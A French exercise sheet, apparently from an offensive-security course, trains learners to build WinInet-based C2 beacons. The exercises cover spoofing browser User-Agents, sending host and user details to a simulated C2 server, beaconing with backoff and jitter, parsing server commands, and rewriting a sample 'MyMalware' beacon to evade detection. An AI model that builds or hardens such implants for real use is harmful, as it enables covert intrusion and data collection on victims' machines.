# Exercices - WinInet Client

## Objectifs des exercices

Ces exercices vous permettront de pratiquer les concepts vus dans le cours.
Commencez par l'exercice 1 (très facile) et progressez vers les plus difficiles.

---

## Exercice 1 : Première requête WinInet (Très facile)

**Objectif** : Envoyer une requête GET simple avec WinInet

**Instructions** :
1. Créez un programme qui utilise WinInet pour faire une requête GET vers `http://httpbin.org/get`
2. Affichez le code de statut HTTP retourné
3. Affichez les premiers 500 caractères de la réponse

**Résultat attendu** :
```
[+] InternetOpen successful
[+] InternetConnect successful
[+] HttpOpenRequest successful
[+] Request sent
Response: {
  "args": {},
  "headers": {
    "Host": "httpbin.org",
    ...
```

**Indice** : Utilisez `InternetOpen` avec `INTERNET_OPEN_TYPE_PRECONFIG`, puis `InternetConnect` sur le port 80.

---

## Exercice 2 : User-Agent personnalisé (Facile)

**Objectif** : Modifier le User-Agent pour imiter différents navigateurs

**Instructions** :
1. Créez un tableau de 3 User-Agents différents (Chrome, Firefox, Edge)
2. Faites une requête à `http://httpbin.org/user-agent` avec chaque UA
3. Affichez la réponse pour vérifier que le serveur voit votre UA
4. Comparez avec un UA suspect comme "MyC2Agent/1.0"

**Résultat attendu** :
```
Testing User-Agent: Mozilla/5.0 (Chrome)
Response: {"user-agent": "Mozilla/5.0 (Chrome)"}

Testing User-Agent: Mozilla/5.0 (Firefox)
Response: {"user-agent": "Mozilla/5.0 (Firefox)"}
...
```

**Question** : Quel User-Agent serait le moins suspect dans un environnement d'entreprise ?

---

## Exercice 3 : POST avec données JSON (Moyen)

**Objectif** : Envoyer des données JSON au serveur C2 (simulé)

**Instructions** :
1. Créez une structure `BeaconInfo` avec : hostname, username, OS version
2. Récupérez ces informations système (GetComputerNameA, GetUserNameA, GetVersionEx)
3. Formatez-les en JSON manuellement (sprintf)
4. Envoyez via POST à `http://httpbin.org/post`
5. Vérifiez que les données sont bien reçues dans la réponse

**Critères de réussite** :
- [ ] Structure BeaconInfo correctement remplie
- [ ] JSON valide (utilisez un validateur en ligne)
- [ ] Requête POST avec header `Content-Type: application/json`
- [ ] Réponse affichée et données vérifiées

**Exemple de JSON attendu** :
```json
{
  "hostname": "DESKTOP-ABC123",
  "username": "john.doe",
  "os_version": "10.0.19044"
}
```

---

## Exercice 4 : Beacon HTTP avec retry (Difficile)

**Objectif** : Créer un beacon robuste avec gestion d'erreurs

**Contexte** :
Vous devez créer un agent C2 qui contacte le serveur toutes les 30 secondes. Si le serveur est injoignable, l'agent doit réessayer avec un backoff exponentiel (attendre de plus en plus longtemps).

**Instructions** :
1. Créez une fonction `SendBeacon(server, port, uri)` qui retourne TRUE/FALSE
2. Implémentez une boucle principale qui :
   - Appelle SendBeacon toutes les 30 secondes
   - En cas d'échec, attend 1 min, puis 2 min, puis 4 min (max 10 min)
   - Reset le délai à 30s en cas de succès
3. Loggez chaque tentative dans un fichier `beacon.log` avec timestamp
4. Ajoutez une limite de 10 échecs consécutifs avant arrêt

**Critères de réussite** :
- [ ] Beacon fonctionne en boucle infinie
- [ ] Backoff exponentiel implémenté correctement
- [ ] Logs détaillés (timestamp, status, next retry time)
- [ ] Gestion propre des handles WinInet (pas de leaks)
- [ ] Arrêt automatique après 10 échecs

**Bonus** :
- Ajoutez un jitter aléatoire de ±10% sur les intervalles (module W55)
- Parsez la réponse du serveur pour extraire des commandes

**Exemple de log** :
```
[2025-12-07 15:30:00] Beacon attempt #1 - SUCCESS
[2025-12-07 15:30:30] Beacon attempt #2 - SUCCESS
[2025-12-07 15:31:00] Beacon attempt #3 - FAILED (timeout)
[2025-12-07 15:32:00] Beacon attempt #4 - FAILED (retry in 2 min)
[2025-12-07 15:34:00] Beacon attempt #5 - SUCCESS (reset interval)
```

---

## Exercice 5 : Detection OPSEC (Challenge)

**Objectif** : Analyser et améliorer l'OPSEC d'un beacon

**Code fourni** :
```c
// Beacon suspect
HINTERNET h = InternetOpen("MyMalware/1.0",
    INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
HINTERNET c = InternetConnect(h, "192.168.1.100", 8080,
    NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
HINTERNET r = HttpOpenRequest(c, "POST", "/cmd.php",
    NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
HttpSendRequest(r, NULL, 0, "infected", 8);
```

**Instructions** :
1. Listez tous les problèmes OPSEC de ce code (au moins 6)
2. Réécrivez le code en version "OPSEC-friendly"
3. Justifiez chaque modification

**Problèmes à identifier** :
- User-Agent suspect
- IP directe (pas de domaine)
- Port non-standard
- HTTP au lieu de HTTPS
- URI suspect (/cmd.php)
- Données POST non chiffrées
- Pas de gestion proxy
- Etc.

---

## Auto-évaluation

Avant de passer au module suivant, vérifiez que vous pouvez :
- [ ] Expliquer la différence entre WinInet et WinHTTP
- [ ] Écrire un beacon HTTP GET/POST sans regarder l'exemple
- [ ] Implémenter une gestion d'erreurs robuste
- [ ] Identifier les erreurs OPSEC dans du code WinInet
- [ ] Utiliser les paramètres proxy système automatiquement
